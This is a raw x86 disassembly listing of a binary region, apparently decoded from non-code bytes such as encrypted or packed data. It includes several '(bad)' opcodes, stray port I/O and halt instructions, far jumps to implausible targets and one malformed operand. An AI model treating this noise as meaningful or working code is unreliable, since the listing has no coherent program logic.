  41026d:	mov    ebx,DWORD PTR [ebx+0x205e70ca]
  410273:	push   ss
  410274:	scas   eax,DWORD PTR es:[edi]
  410275:	jmp    0x410233
  410277:	jno    0x4102c0
  410279:	mov    ebx,0x42925d36
  41027e:	popa   
  41027f:	out    0x83,eax
  410281:	push   ds
  410282:	(bad)  
  410284:	fild   WORD PTR [ebx-0x1b]
  410287:	addr16 call 0x27a8:0x6d85429a
  41028f:	rcl    cl,cl
  410291:	repz add al,0x2b
  410294:	or     esi,edi
  410296:	sub    edi,ebx
  410298:	push   ds
  410299:	aad    0x3d
  41029b:	push   ecx
  41029c:	xchg   DWORD PTR [eax+0x4],edi
  41029f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102a0:	sbb    BYTE PTR [edi-0x31],bl
  4102a3:	mov    ah,BYTE PTR [ecx]
  4102a5:	xor    esi,DWORD PTR [ebx-0x6a]
  4102a8:	adc    bl,0xf6
  4102ab:	mul    DWORD PTR [eax-0x2c]
  4102ae:	jmp    0x958a:0x39a45648
  4102b5:	cmc    
  4102b6:	dec    ecx
  4102b7:	inc    esp
  4102b8:	adc    eax,0x4cad2726
  4102bd:	int3   
  4102be:	hlt    
  4102bf:	sub    esi,0x7cd02af5
  4102c5:	xlat   BYTE PTR ds:[ebx]
  4102c6:	adc    BYTE PTR [ebp-0x6625bf18],al
  4102cc:	xchg   esi,eax
  4102cd:	dec    edi
  4102ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102cf:	popa   
  4102d0:	pop    ds
  4102d1:	leave  
  4102d2:	or     edx,DWORD PTR [edi+0x24710c27]
  4102d8:	adc    BYTE PTR [ebp+0x2c],bl
  4102db:	jecxz  0x410305
  4102dd:	jecxz  0x410283
  4102df:	sti    
  4102e0:	xchg   DWORD PTR [esi-0x6b],esi
  4102e3:	mov    al,ds:0x457ad0d4
  4102e8:	mov    ebp,0x97b02e99
  4102ed:	popf   
  4102ee:	adc    al,0xa9
  4102f0:	dec    edx
  4102f1:	add    eax,0xa4dd709b
  4102f6:	mov    esi,0xe1467def
  4102fb:	mov    bh,0xd
  4102fd:	push   ecx
  4102fe:	xor    al,0xe2
  410300:	adc    dl,BYTE PTR [ebx]
  410302:	ins    DWORD PTR es:[edi],dx
  410303:	mov    dl,0x16
  410305:	sub    edi,ebp
  410307:	mov    edx,?
  410309:	mov    esp,0x5ffc03b2
  41030e:	popf   
  41030f:	(bad)  
  410310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410311:	scas   eax,DWORD PTR es:[edi]
  410312:	stos   DWORD PTR es:[edi],eax
  410313:	sbb    DWORD PTR [ebx+0x3a13302e],0x8
  41031a:	push   eax
  41031b:	adc    eax,0x67dd935c
  410320:	dec    ecx
  410321:	mov    ds:0x323e7298,al
  410326:	xchg   esp,eax
  410327:	and    BYTE PTR [esi+edx*4],bl
  41032a:	cdq    
  41032b:	pop    edx
  41032c:	aad    0xc3
  41032e:	cmp    al,0x78
  410330:	jl     0x4102be
  410332:	repnz daa 
  410334:	popf   
  410335:	push   edx
  410336:	jecxz  0x4102e3
  410338:	jmp    0x4102d9
  41033a:	cwde   
  41033b:	pop    eax
  41033c:	adc    ebp,eax
  41033e:	push   ds
  41033f:	mov    eax,ds:0xb5529b93
  410344:	aam    0xbd
  410346:	pop    ds
  410347:	in     eax,dx
  410348:	stc    
  410349:	cmp    ebp,DWORD PTR [esi+0x1c6b7413]
  41034f:	lods   al,BYTE PTR ds:[esi]
  410350:	add    ebp,ebp
  410352:	adc    BYTE PTR [ebx+edi*4-0x16cb916b],dl
  410359:	(bad)  
  41035b:	fdivr  st(4),st
  41035d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41035e:	jg     0x4102e8
  410360:	mov    edi,0x891a33
  410365:	stos   DWORD PTR es:[edi],eax
  410366:	push   esp
  410367:	cld    
  410368:	jmp    0x7593808f
  41036d:	mov    al,ds:0x5eaf0c97
  410372:	pop    es
  410373:	pop    ecx
  410374:	or     al,0x14
  410376:	adc    BYTE PTR [ebx+0x5a],ch
  410379:	mov    ecx,0x8596ad58
  41037e:	popa   
  41037f:	gs pop ebp
  410381:	jmp    0xe36a1a5e
  410386:	push   es
  410387:	fnclex 
  410389:	popf   
  41038a:	vandnps ymm7,ymm6,YMMWORD PTR cs:[eax]
  41038f:	xchg   ebx,eax
  410390:	add    bl,BYTE PTR [edx]
  410392:	sub    BYTE PTR [ecx-0x25],bh
  410395:	add    DWORD PTR [esi-0x5],ebp
  410398:	test   eax,0x13ce8383
  41039d:	mov    ds:0xb546fed,al
  4103a2:	xchg   esp,eax
  4103a3:	ja     0x41040f
  4103a5:	sub    dl,BYTE PTR [edi]
  4103a7:	sub    al,BYTE PTR [edx-0x6c]
  4103aa:	int3   
  4103ab:	out    0x90,al
  4103ad:	dec    ecx
  4103ae:	push   ss
  4103af:	imul   ebp,DWORD PTR [ebp+0x35233206],0x58
  4103b6:	test   eax,0xbebe90b9
  4103bb:	dec    BYTE PTR [esi]
  4103bd:	push   edx
  4103be:	aas    
  4103bf:	ja     0x4103d8
  4103c1:	mov    cl,0x94
  4103c3:	mov    DWORD PTR [ecx],edx
  4103c5:	push   ebx
  4103c6:	pop    ecx
  4103c7:	sahf   
  4103c8:	push   esi
  4103c9:	adc    bl,bh
  4103cb:	push   0x5adf21cc
  4103d0:	clc    
  4103d1:	out    dx,eax
  4103d2:	pop    ebx
  4103d3:	lods   al,BYTE PTR ds:[esi]
  4103d4:	dec    edx
  4103d5:	mov    dh,0x9f
  4103d7:	xor    eax,0x9337d0d3
  4103dc:	ja     0x4103d6
  4103de:	dec    ebx
  4103df:	in     al,dx
  4103e0:	mov    al,ds:0x652816f1
  4103e5:	sbb    DWORD PTR [edi-0x68532f84],esp
  4103eb:	xor    eax,0xd6239f6b
  4103f0:	gs test al,0x2
  4103f3:	and    al,BYTE PTR [eax+0x48]
  4103f6:	cmc    
  4103f7:	mov    edi,0xde97d1a6
  4103fc:	mov    eax,gs
  4103fe:	enter  0x9b27,0x50
  410402:	lods   al,BYTE PTR ds:[esi]
  410403:	test   al,0x2
  410405:	out    0x9d,eax
  410407:	cmp    DWORD PTR [edi+0xa726040],ebx
  41040d:	cmp    ch,BYTE PTR [eax-0x3343fc73]
  410413:	imul   eax,esi,0xe7b60a1
  410419:	out    0xf4,eax
  41041b:	pop    esi
  41041c:	xor    eax,0x9d08b1f2
  410421:	or     eax,0x2b0eec8f
  410426:	push   ebx
  410427:	push   cs
  410428:	pop    edi
  410429:	rcl    BYTE PTR [ebx],1
  41042b:	jge    0x410442
  41042d:	jmp    0xab0f:0x371921f3
  410434:	xchg   ebx,esp
  410436:	mov    esi,0xdd143d84
  41043b:	dec    esi
  41043c:	cld    
  41043d:	call   edi
  41043f:	not    BYTE PTR [eax+ebx*1+0xada94ba]
  410446:	jbe    0x410497
  410448:	into   
  410449:	push   esi
  41044a:	arpl   WORD PTR [ebp-0x793205fb],bp
  410450:	in     al,0x10
  410452:	in     al,dx
  410453:	fstp   TBYTE PTR [eax+ebp*1]
  410456:	shl    ebp,cl
  410458:	lahf   
  410459:	ds jne 0x410428
  41045c:	push   0xf6a19c35
  410461:	int    0x72
  410463:	ror    bh,1
  410465:	mov    esi,0x3a5b9962
  41046a:	xchg   BYTE PTR [eax],ah
  41046c:	fwait
  41046d:	idiv   BYTE PTR [edi+esi*8]
  410470:	ds jbe 0x41045c
  410473:	jle    0x4104df
  410475:	or     al,0x30
  410477:	popa   
  410478:	fdiv   QWORD PTR [edi+eax*8+0x14]
  41047c:	jo     0x4104f7
  41047e:	pushf  
  41047f:	push   ds
  410480:	sbb    ch,bl
  410482:	not    BYTE PTR [edx+0x4f]
  410485:	js     0x4104ca
  410487:	leave  
  410488:	add    ebx,DWORD PTR [eax+0x310e4693]
  41048e:	sbb    DWORD PTR [edx+0x5d],ebp
  410491:	add    ah,bl
  410493:	dec    edi
  410494:	push   0xe99436fb
  410499:	leave  
  41049a:	xor    cl,al
  41049c:	fdivr  QWORD PTR [ecx-0x34f120b4]
  4104a2:	in     eax,dx
  4104a3:	(bad)  
  4104a4:	lock aam 0x1a
  4104a7:	mov    BYTE PTR [edx+0x50],bh
  4104aa:	sub    ch,BYTE PTR [esi]
  4104ac:	pop    edi
  4104ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ae:	in     al,0xc1
  4104b0:	cmp    ebx,ebx
  4104b2:	mov    eax,ds:0x5c999d80
  4104b7:	jne    0x41049d
  4104b9:	mov    WORD PTR [ebx+0x2f],ss
  4104bc:	sbb    bh,BYTE PTR [esi+0x6a]
  4104bf:	inc    edx
  4104c0:	addr16 pushf 
  4104c2:	in     eax,0xb6
  4104c4:	sub    eax,ebx
  4104c6:	jb     0x41052c
  4104c8:	add    al,0x5c
  4104ca:	push   esp
  4104cb:	adc    DWORD PTR [edi],ebp
  4104cd:	dec    esi
  4104ce:	jp     0x410504
  4104d0:	shl    DWORD PTR [eax+eiz*2-0x4a],cl
  4104d4:	jns    0x4104b5
  4104d6:	mov    ds:0x36c7ac33,eax
  4104db:	pop    es
  4104dc:	and    edx,ebp
  4104de:	push   eax
  4104df:	push   0xffffff8f
  4104e1:	repnz loope 0x410521
  4104e4:	in     eax,0x6c
  4104e6:	mov    ds:0xc9d06417,eax
  4104eb:	jo     0x4104c3
  4104ed:	mov    BYTE PTR [ecx+0x606d090b],bl
  4104f3:	in     eax,0x77
  4104f5:	sar    DWORD PTR [ecx-0x50eccb14],0xd9
  4104fc:	ret    0xb379
  4104ff:	push   0xf21af691
  410504:	jmp    0x590d732b
  410509:	leave  
  41050a:	vunpckhps xmm7,xmm7,XMMWORD PTR [eax]
  41050e:	adc    al,0xa
  410510:	arpl   WORD PTR [ebp+0x61a87ba8],cx
  410516:	adc    DWORD PTR [esi],esi
  410518:	ds daa 
  41051a:	sahf   
  41051b:	and    eax,0xf65d0ca4
  410520:	rcr    DWORD PTR [edx-0x68a2d126],0xf4
  410527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410528:	push   esi
  410529:	mov    ch,0x42
  41052b:	mov    edi,eax
  41052d:	paddsb mm2,QWORD PTR [ecx]
  410530:	sub    DWORD PTR [edi+ecx*2],esp
  410533:	gs loope 0x41050a
  410536:	mov    DWORD PTR [edx+0x54654f9e],edi
  41053c:	push   ecx
  41053d:	mov    al,0x3c
  41053f:	mov    dh,BYTE PTR [eax-0x3ab1dcb0]
  410545:	addr16 cmp bh,cl
  410548:	adc    ebp,ebp
  41054a:	inc    ebp
  41054b:	inc    edx
  41054c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41054d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054e:	xchg   edx,eax
  41054f:	(bad)  
  410550:	cld    
  410551:	xor    dh,BYTE PTR [esi-0x22]
  410554:	and    bl,BYTE PTR [ebx]
  410556:	dec    esp
  410557:	fwait
  410558:	adc    ebx,edi
  41055a:	sahf   
  41055b:	outs   dx,DWORD PTR ds:[esi]
  41055c:	dec    ebx
  41055d:	cmp    DWORD PTR [esi+ecx*1],0xffffff99
  410561:	std    
  410562:	imul   eax,DWORD PTR [esi],0xfd2b9121
  410568:	inc    eax
  410569:	jo     0x4105e1
  41056b:	jmp    0xc63c577b
  410570:	je     0x4105bc
  410572:	or     eax,0x1a5feb33
  410577:	data16 sbb al,BYTE PTR fs:[eax+0x0]
  41057c:	sub    cl,BYTE PTR [esi]
  41057e:	addr16 push ds
  410580:	out    dx,eax
  410581:	xchg   ebp,eax
  410582:	inc    ebp
  410583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410584:	cmp    al,0xfd
  410586:	add    eax,0xb78e34f4
  41058b:	sbb    BYTE PTR [ebp+0x34e95d92],0x7e
  410592:	inc    edx
  410593:	div    DWORD PTR [ebx+0x79]
  410596:	inc    esp
  410597:	add    eax,0xa5097280
  41059c:	scas   eax,DWORD PTR es:[edi]
  41059d:	pop    es
  41059e:	jl     0x410572
  4105a0:	inc    esi
  4105a1:	push   ss
  4105a2:	pop    eax
  4105a3:	pop    eax
  4105a4:	fcom   DWORD PTR [ebp-0x6e]
  4105a7:	mov    esp,0x88f95bf4
  4105ac:	cli    
  4105ad:	sub    cl,BYTE PTR [eax+edi*4]
  4105b0:	pop    ss
  4105b1:	push   ebx
  4105b2:	jno    0x41056b
  4105b4:	pusha  
  4105b5:	mov    DWORD PTR ds:0x2526688f,ecx
  4105bb:	into   
  4105bc:	rcr    DWORD PTR [ecx+eax*8-0x22],0x8c
  4105c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105c2:	lahf   
  4105c3:	outs   dx,DWORD PTR ds:[esi]
  4105c4:	out    0x4a,eax
  4105c6:	lods   eax,DWORD PTR ds:[esi]
  4105c7:	out    dx,eax
  4105c8:	hlt    
  4105c9:	icebp  
  4105ca:	popa   
  4105cb:	rcl    BYTE PTR [edx-0x7b],0x8e
  4105cf:	inc    edi
  4105d0:	hlt    
  4105d1:	cmp    al,BYTE PTR [eax+0x371e5a96]
  4105d7:	mov    esp,0x3360ec65
  4105dc:	retf   0x3bdf
  4105df:	fmul   st(0),st
  4105e1:	sub    BYTE PTR [ebx+0x72dbd540],0x9
  4105e8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4105ea:	std    
  4105eb:	mov    ebx,0x2236d050
  4105f0:	adc    eax,0x7cd12ed9
  4105f5:	retf   0xb324
  4105f8:	ja     0x41060f
  4105fa:	cmp    BYTE PTR [edx],dh
  4105fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105fd:	(bad)  
  4105fe:	fsub   st(7),st
  410600:	xor    esp,DWORD PTR [edi]
  410602:	fldenv [edx+0xa]
  410605:	jl     0x4105fb
  410607:	stc    
  410608:	fsubr  st,st(1)
  41060a:	jmp    0xeb0:0xf9383df1
  410611:	(bad)  [eax-0x80]
  410614:	dec    ebp
  410615:	and    esp,DWORD PTR [esi]
  410617:	jno    0x4105dc
  410619:	pop    edi
  41061a:	hlt    
  41061b:	repz jp 0x410611
  41061e:	ds lahf 
  410620:	adc    edi,DWORD PTR [esi]
  410622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410623:	test   eax,0x761838a2
  410628:	ror    BYTE PTR [esi+0x322856f4],0x6e
  41062f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410630:	shl    DWORD PTR [ebx+0x5a],1
  410633:	leave  
  410634:	rol    DWORD PTR [edi],0x72
  410637:	mov    dh,BYTE PTR ds:0x3216b0fb
  41063d:	daa    
  41063e:	ret    0xc1ad
  410641:	jne    0x410650
  410643:	repnz push ds
  410645:	xor    DWORD PTR [ebp+0x5e],ebx
  410648:	or     BYTE PTR [edx+0x33a08658],cl
  41064e:	jae    0x410692
  410650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410651:	pop    ss
  410652:	inc    edi
  410653:	(bad)  
  410654:	aaa    
  410655:	cwde   
  410656:	jmp    0x55cc:0x78bce12f
  41065d:	inc    ebp
  41065e:	add    ah,bh
  410660:	mov    bl,0xa0
  410662:	pop    es
  410663:	sub    DWORD PTR fs:[edx],ecx
  410666:	xor    eax,0xf114d672
  41066b:	bound  esi,QWORD PTR [eax-0x79aa86de]
  410671:	add    ah,BYTE PTR [edi+0x1f]
  410674:	push   cs
  410675:	sub    edi,DWORD PTR [edi+0x46]
  410678:	fwait
  410679:	xchg   esp,eax
  41067a:	jmp    0xdb552603
  41067f:	push   eax
  410680:	(bad)  
  410681:	pusha  
  410682:	and    ch,BYTE PTR [esi+0x45]
  410685:	and    al,0xe1
  410687:	ret    
  410688:	sbb    al,0xbe
  41068a:	outs   dx,DWORD PTR ds:[esi]
  41068b:	add    esp,DWORD PTR ds:0x47d2c1fc
  410691:	mov    ss,edi
  410693:	nop
  410694:	push   bx
  410696:	push   esi
  410697:	lds    ebx,FWORD PTR [edx]
  410699:	sub    esp,DWORD PTR [ecx]
  41069b:	repz mov ds:0x5b92decd,eax
  4106a1:	sbb    dh,cl
  4106a3:	iret   
  4106a4:	ret    
  4106a5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4106a7:	sahf   
  4106a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106a9:	jns    0x410659
  4106ab:	jmp    0x4106ad
  4106ad:	call   0x29a4:0x8b020fe4
  4106b4:	imul   ecx,ebx,0xa
  4106b7:	jnp    0x410647
  4106b9:	push   0xffffffac
  4106bb:	dec    esi
  4106bc:	lods   eax,DWORD PTR ds:[esi]
  4106bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106be:	xor    BYTE PTR [esp+ecx*1],bh
  4106c1:	pop    ds
  4106c2:	imul   eax,DWORD PTR [esi+0x6f9b490a],0x46
  4106c9:	dec    edi
  4106ca:	out    0xc3,al
  4106cc:	aam    0x83
  4106ce:	pop    edi
  4106cf:	jmp    0x41071b
  4106d1:	mov    edx,DWORD PTR [ebx+0x42]
  4106d4:	xor    esi,DWORD PTR fs:[esi-0x34dfc835]
  4106db:	mov    al,0xfe
  4106dd:	test   BYTE PTR [eax+ecx*1+0x3a],al
  4106e1:	cmp    bh,BYTE PTR [edx-0x50]
  4106e4:	lahf   
  4106e5:	rcl    DWORD PTR [edi-0x41],cl
  4106e8:	mov    al,0x2b
  4106ea:	(bad)  
  4106eb:	xor    ecx,DWORD PTR [edx+eax*2]
  4106ee:	jmp    0xe6496f4
  4106f3:	sub    DWORD PTR [edx-0x5fcaa1c4],ebp
  4106f9:	mov    edx,0xe402cc79
  4106fe:	sub    al,0x4e
  410700:	rcl    DWORD PTR ds:0xa1f525da,0x21
  410707:	test   eax,0x2d30b7fd
  41070c:	mov    ebp,0x6dbbc1a8
  410711:	repnz xor dh,dl
  410714:	inc    eax
  410715:	ror    cl,0x73
  410718:	popf   
  410719:	xchg   BYTE PTR [ecx-0x14a69227],dl
  41071f:	sbb    ebx,eax
  410721:	in     al,dx
  410722:	jbe    0x4106bd
  410724:	in     eax,dx
  410725:	xchg   ebx,eax
  410726:	test   al,0x95
  410728:	xor    edi,eax
  41072a:	or     ecx,edx
  41072c:	int    0x5f
  41072e:	sub    eax,0x37f4d9b6
  410733:	ret    
  410734:	jp     0x41077e
  410736:	push   0x63
  410738:	cmp    DWORD PTR [edx],ecx
  41073a:	adc    bl,BYTE PTR [eax+0x60]
  41073d:	jae    0x410711
  41073f:	fdivr  DWORD PTR [ebp+0x4d]
  410742:	mov    ebx,esi
  410744:	(bad)  
  410745:	div    DWORD PTR [edi]
  410747:	mov    WORD PTR [ecx-0x16],cs
  41074a:	inc    eax
  41074b:	sub    esi,DWORD PTR [ebp-0x15]
  41074e:	into   
  41074f:	pop    ebx
  410750:	ret    
  410751:	sbb    BYTE PTR [edi-0x72b23ef2],cl
  410757:	sar    ebp,0x7f
  41075a:	(bad)  
  41075b:	cmp    ebp,edx
  41075d:	dec    ecx
  41075e:	inc    edx
  41075f:	mov    esi,DWORD PTR [eax+0x577214fa]
  410765:	pushf  
  410766:	sbb    ebp,eax
  410768:	adc    ch,dl
  41076a:	(bad)  
  41076c:	mov    DWORD PTR [ebp+edi*2-0xed36145],ebx
  410773:	fisub  DWORD PTR [ecx+0x2c]
  410776:	rcl    BYTE PTR [edx-0x58816c19],cl
  41077c:	rol    DWORD PTR [ebx+0x6e],0x5e
  410780:	mov    DWORD PTR [ebx],edx
  410782:	xchg   BYTE PTR [edx+0x68],ch
  410785:	ja     0x4107cc
  410787:	xor    ebx,DWORD PTR [edi+ebx*2]
  41078a:	iret   
  41078b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41078c:	cmp    edx,edi
  41078e:	sar    DWORD PTR [eax-0x8fa106c],1
  410794:	bnd ret 0xd280
  410798:	dec    edx
  410799:	aas    
  41079a:	lds    ebx,FWORD PTR [edi+0x29]
  41079d:	fwait
  41079e:	mov    edx,DWORD PTR [ebx-0x24976d0f]
  4107a4:	xchg   ebp,eax
  4107a5:	mov    ds:0xc5e55244,al
  4107aa:	fdiv   st,st(7)
  4107ac:	imul   esi,DWORD PTR cs:[eax+0x21],0x30d686be
  4107b4:	sub    eax,0x93a94152
  4107b9:	ds pop esi
  4107bb:	inc    eax
  4107bc:	mov    ch,0xc0
  4107be:	jmp    0x28726586
  4107c3:	adc    eax,0xb0d99a28
  4107c8:	aas    
  4107c9:	jle    0x41075d
  4107cb:	test   al,0x8d
  4107cd:	lods   eax,DWORD PTR ds:[esi]
  4107ce:	shl    DWORD PTR [ebx+eiz*8-0x16212acf],cl
  4107d5:	cmp    BYTE PTR [edi+0x77],cl
  4107d8:	push   cs
  4107d9:	push   ecx
  4107da:	pop    esp
  4107db:	pop    edx
  4107dc:	mov    bh,BYTE PTR ds:0xcc156dcb
  4107e2:	dec    ebx
  4107e3:	push   0x4a
  4107e5:	test   BYTE PTR [ebp-0x6f],dl
  4107e8:	sar    dl,0x9a
  4107eb:	stos   DWORD PTR es:[edi],eax
  4107ec:	(bad)  
  4107ed:	arpl   WORD PTR [eax],bp
  4107ef:	and    eax,0xa53586f9
  4107f4:	lock push esp
  4107f6:	fild   WORD PTR [edi+0x8bb9158]
  4107fc:	mov    eax,ds:0xd95c9f0c
  410801:	cmp    BYTE PTR [ebx],cl
  410803:	(bad)  
  410804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410805:	repnz outs dx,BYTE PTR ds:[esi]
  410807:	xchg   esp,eax
  410808:	fwait
  410809:	mov    bl,0xb3
  41080b:	dec    esi
  41080c:	add    DWORD PTR [edx+0x13ae1777],ebp
  410812:	retf   
  410813:	stc    
  410814:	xchg   ecx,eax
  410815:	push   es
  410816:	fldcw  WORD PTR [ebp+ecx*2+0x41]
  41081a:	inc    ebx
  41081b:	xor    al,0x94
  41081d:	(bad)  
  41081e:	lea    eax,[edi]
  410820:	jge    0x410812
  410822:	rol    DWORD PTR [esi+0x25c58cc6],cl
  410828:	in     eax,dx
  410829:	retf   0x1041
  41082c:	mov    edi,0x6cd3691d
  410831:	les    edx,FWORD PTR [edi-0x11a37f7]
  410837:	jns    0x4108b4
  410839:	dec    ecx
  41083a:	call   0x16523f2
  41083f:	ins    BYTE PTR es:[edi],dx
  410840:	je     0x410890
  410842:	dec    ebx
  410843:	mov    ch,0x54
  410845:	call   0xbd8dda92
  41084a:	inc    eax
  41084b:	mov    edi,0x1e5e5bb8
  410850:	sahf   
  410851:	inc    esi
  410852:	xor    BYTE PTR [eax+0x66],0x0
  410856:	mov    dh,0x84
  410858:	shl    edi,cl
  41085a:	fidiv  WORD PTR [ecx+eiz*8-0x5ff0c9d4]
  410861:	rol    DWORD PTR ds:0x4afc1d59,0x8d
  410868:	adc    BYTE PTR [edx],0x1b
  41086b:	xlat   BYTE PTR ds:[ebx]
  41086c:	push   0x8196cf0a
  410871:	repz sbb BYTE PTR [esi-0x7b1c9a58],dl
  410878:	jns    0x410879
  41087a:	es sbb eax,0x12952ae2
  410880:	and    eax,esp
  410882:	(bad)  
  410884:	mov    esp,0xadbaad32
  410889:	(bad)  
  41088b:	sub    BYTE PTR [esi-0x4a],dh
  41088e:	sub    ecx,DWORD PTR [eax]
  410890:	aad    0xb0
  410892:	das    
  410893:	dec    esi
  410894:	sbb    esi,eax
  410896:	xor    esi,DWORD PTR [ebp+0x6a12ea8c]
  41089c:	(bad)  
  41089d:	mov    DWORD PTR [eax+edi*4],0x17bec2d1
  4108a4:	pxor   mm4,QWORD PTR ds:0x5f2ac916
  4108ab:	lods   al,BYTE PTR ds:[esi]
  4108ac:	add    BYTE PTR [esi+0x253a3c9a],ah
  4108b2:	(bad)  
  4108b3:	push   esi
  4108b4:	outs   dx,BYTE PTR ds:[esi]
  4108b5:	inc    ebp
  4108b6:	dec    ebp
  4108b7:	fisttp QWORD PTR [esi-0x7e0f63ed]
  4108bd:	cli    
  4108be:	and    DWORD PTR [edx],esp
  4108c0:	(bad)  
  4108c1:	pop    eax
  4108c2:	xor    eax,0x288e82eb
  4108c7:	sbb    eax,0x3e14083c
  4108cc:	and    eax,DWORD PTR [esi-0x351a249c]
  4108d2:	jns    0x410896
  4108d4:	add    al,0xe5
  4108d6:	mov    esp,0x660ffc03
  4108db:	sub    al,0x65
  4108dd:	stc    
  4108de:	inc    esi
  4108df:	int3   
  4108e0:	retf   0x5dd4
  4108e3:	add    ecx,0xfffffff9
  4108e6:	mov    eax,0xc5d94444
  4108eb:	ficom  DWORD PTR [ebx+edi*1-0x7473467f]
  4108f2:	or     al,0xe8
  4108f4:	jo     0x410942
  4108f6:	push   edi
  4108f7:	fwait
  4108f8:	or     DWORD PTR [ecx-0x651b557],0xb8c2003d
  410902:	pop    es
  410903:	ins    DWORD PTR es:[edi],dx
  410904:	daa    
  410905:	or     eax,0x1ef0051a
  41090a:	ins    DWORD PTR es:[edi],dx
  41090b:	mov    ch,0x8b
  41090d:	xor    al,0xec
  41090f:	shr    BYTE PTR [ecx+0x522c439b],cl
  410915:	test   cl,cl
  410917:	pop    ebx
  410918:	pop    esp
  410919:	jp     0x41095f
  41091b:	inc    ebp
  41091c:	pop    esi
  41091d:	arpl   WORD PTR [edx-0x772e4db4],bx
  410923:	ins    BYTE PTR es:[edi],dx
  410924:	pop    eax
  410925:	mov    esi,0xa7e90641
  41092a:	jl     0x41099d
  41092c:	aad    0x86
  41092e:	iret   
  41092f:	mov    edi,0x6ab8a992
  410934:	int3   
  410935:	xchg   ebx,eax
  410936:	test   bh,0x25
  410939:	ret    
  41093a:	push   0x146e7886
  41093f:	or     ebp,DWORD PTR [esi]
  410941:	mov    ah,0x7a
  410943:	and    ch,BYTE PTR [edi+ebx*4]
  410946:	aam    0xf3
  410948:	mov    eax,DWORD PTR ds:0x7731140b
  41094e:	test   al,0x2b
  410950:	lock or BYTE PTR [edx-0x509a7cd6],dl
  410957:	and    eax,0x2228a26e
  41095c:	mov    al,0x83
  41095e:	lds    ebx,FWORD PTR [ecx-0x334131c4]
  410964:	sar    DWORD PTR [edx],cl
  410966:	sub    al,0xce
  410968:	adc    esp,DWORD PTR [ebx]
  41096a:	add    edx,DWORD PTR [ecx]
  41096c:	mov    edi,0x1faf3e3f
  410971:	dec    edx
  410972:	xor    DWORD PTR [ecx+0x1dc33504],0xef336c86
  41097c:	mov    bl,al
  41097e:	xor    DWORD PTR [ecx+0x10255225],edx
  410984:	pop    ebx
  410985:	xlat   BYTE PTR gs:[ebx]
  410987:	jle    0x410944
  410989:	retf   0x67eb
  41098c:	fst    QWORD PTR [edx]
  41098e:	and    al,0xc1
  410990:	out    dx,eax
  410991:	sbb    eax,0xe4c9cd96
  410996:	push   ebx
  410997:	retf   0xa36a
  41099a:	jmp    0xb1e7:0xc8ff4207
  4109a1:	dec    ecx
  4109a2:	inc    edi
  4109a3:	push   cs
  4109a4:	aas    
  4109a5:	mov    bl,0x7b
  4109a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109a8:	adc    DWORD PTR [ecx+0x30],esp
  4109ab:	xor    al,0x56
  4109ad:	pop    eax
  4109ae:	call   0xe7971e5a
  4109b3:	dec    ecx
  4109b4:	push   eax
  4109b5:	bound  ebp,QWORD PTR [edi+0x3c23f8c1]
  4109bb:	je     0x410977
  4109bd:	fsubr  DWORD PTR [ebx+0x41]
  4109c0:	ret    
  4109c1:	enter  0xb9d5,0xb0
  4109c5:	call   0x9eb8ac91
  4109ca:	mov    eax,ds:0x1b011ca7
  4109cf:	jae    0x4109cd
  4109d1:	(bad)  
  4109d2:	aam    0x26
  4109d4:	adc    bh,al
  4109d6:	pusha  
  4109d7:	push   ebp
  4109d8:	sar    ah,cl
  4109da:	jmp    0xe340:0x1d29f499
  4109e1:	or     BYTE PTR [ebp+0x5ffc0927],al
  4109e7:	mov    al,0xf
  4109e9:	sbb    ebp,DWORD PTR [edi+0x321235eb]
  4109ef:	inc    edi
  4109f0:	rol    BYTE PTR [esi],cl
  4109f2:	mov    al,ds:0x12ff0abb
  4109f7:	fbstp  TBYTE PTR [ebx]
  4109f9:	add    DWORD PTR [edi],0x989c27ee
  4109ff:	or     DWORD PTR [eax],0x508ca035
  410a05:	in     al,0x73
  410a07:	imul   ebx,DWORD PTR [esi-0x11],0xffffffb2
  410a0b:	mov    esi,0x9d41c8e
  410a10:	out    0x65,al
  410a12:	mov    ecx,0xafb195d8
  410a17:	stc    
  410a18:	jnp    0x4109fb
  410a1a:	dec    ebp
  410a1b:	rol    BYTE PTR [ebx],0xaf
  410a1e:	outs   dx,DWORD PTR ds:[esi]
  410a1f:	mov    ebp,0x9a66c829
  410a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a25:	pop    esi
  410a26:	inc    esi
  410a27:	test   al,0xbb
  410a29:	aam    0x56
  410a2b:	push   ecx
  410a2c:	pop    eax
  410a2d:	jg     0x410a6d
  410a2f:	ins    BYTE PTR es:[edi],dx
  410a30:	loope  0x4109c9
  410a32:	xchg   ah,dl
  410a34:	rol    DWORD PTR [ebx-0x1cf82dca],1
  410a3a:	das    
  410a3b:	lds    esp,FWORD PTR [eax]
  410a3d:	add    DWORD PTR [ebp+0x34fb2a77],0x8f2ce764
  410a47:	pop    eax
  410a48:	out    dx,al
  410a49:	mov    ch,0xe8
  410a4b:	cmp    eax,0x2bb8c12e
  410a50:	test   DWORD PTR [edx-0x71],edx
  410a53:	and    al,0x34
  410a55:	mov    DWORD PTR [edx],esi
  410a57:	push   edx
  410a58:	or     bl,BYTE PTR [esi-0x1f]
  410a5b:	cmc    
  410a5c:	mov    ds:0x1eff74b9,eax
  410a61:	add    dh,BYTE PTR [eax]
